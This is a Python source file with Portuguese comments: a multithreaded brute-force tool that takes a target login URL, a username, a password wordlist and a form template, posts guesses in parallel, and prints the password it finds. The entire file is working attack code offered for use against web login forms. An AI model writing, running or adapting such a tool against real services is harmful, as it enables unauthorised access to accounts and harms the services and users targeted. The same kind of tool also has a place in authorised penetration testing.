import requests, argparse, threading, os, time

def send_request(url, data, login, error_message, t_number):
    '''
    error_message = Mensagem de login errado
    data = Formulario preenchido
    login = Usuario e senha
    t_number = Numero do thread
    '''
    print(f"[Thread: {t_number}] Testing: {login[0]}:{login[1]}")
    r = requests.post(url,data=data,timeout=3)

    if not error_message in r.text:
       print(f"\nSENHA ENCONTRADA: {login[0]}:{login[1]}\n")
       os._exit(1)

def parse_info(data):
    '''
    data = "usuario=^USER^&senha=^PASS^:Username or password invalid"
    '''

    forms, mensagem_de_erro = data.split(":")
    forms = forms.split("&")
    
    user_form = "".join(i.replace("=^USER^","") for i in forms if "^USER^" in i)
    pass_form = "".join(i.replace("=^PASS^","") for i in forms if "^PASS^" in i)

    return (user_form, pass_form, mensagem_de_erro)

def arguments():
    parser = argparse.ArgumentParser("Brute Force",description="https://reddyyz.github.io",usage='python3 bruteforce.py -u http://localhost/login.php -i "user=^USER^&pass=^PASS^:Username or password invalid"')

    parser.add_argument("-u","--url",help="URL do Alvo")
    parser.add_argument("-t","--threads",help="Número de threads",default=16,type=int)
    parser.add_argument("-i","--info",help="Fomularios para atacar e mensagem de erro")

    parser.add_argument("-uL","--user",help="Usuário")

    parser.add_argument("-P","--pass-wordlist",help="Wordlist para senhas")

    args = parser.parse_args()
    if not args.url:
        exit(parser.print_help())

    if not args.user:
        exit(parser.print_help())
    if not args.pass_wordlist:
        exit(parser.print_help())

    return (args.url, args.threads, args.info, args.user, args.pass_wordlist)

def main():
    url, threads, info, user, pass_wordlist = arguments()
    user_form, pass_form, mensagem_de_erro = parse_info(info)
    # print("Iniciando...\n")
    print(\
f"""
Alvo: {url}
Threads: {threads}
Mensagem de Erro: {mensagem_de_erro}
Formulários:
    USER -> {user_form}
    PASS -> {pass_form}
""")

    time.sleep(2)

    fd = open(pass_wordlist,"r")
    passwords = fd.read().split("\n")
    fd.close()

    while True:
        if not passwords: break
        threads_ = [None] * threads

        for i in range(threads):
            try:
                passwd = passwords[0]
                passwords.remove(passwd)
            except IndexError:
                break

            # url, data, login, error_message
            login = [user, passwd]
            data = {
                user_form: user,
                pass_form: passwd
            }

            threads_[i] = threading.Thread(target=send_request, args=(url, data, login, mensagem_de_erro, i))
            threads_[i].start()

        for thread in threads_:
            try:
                thread.join()
            except:
                pass

    print("Ataque encerrado!")

if __name__ == "__main__":
    main()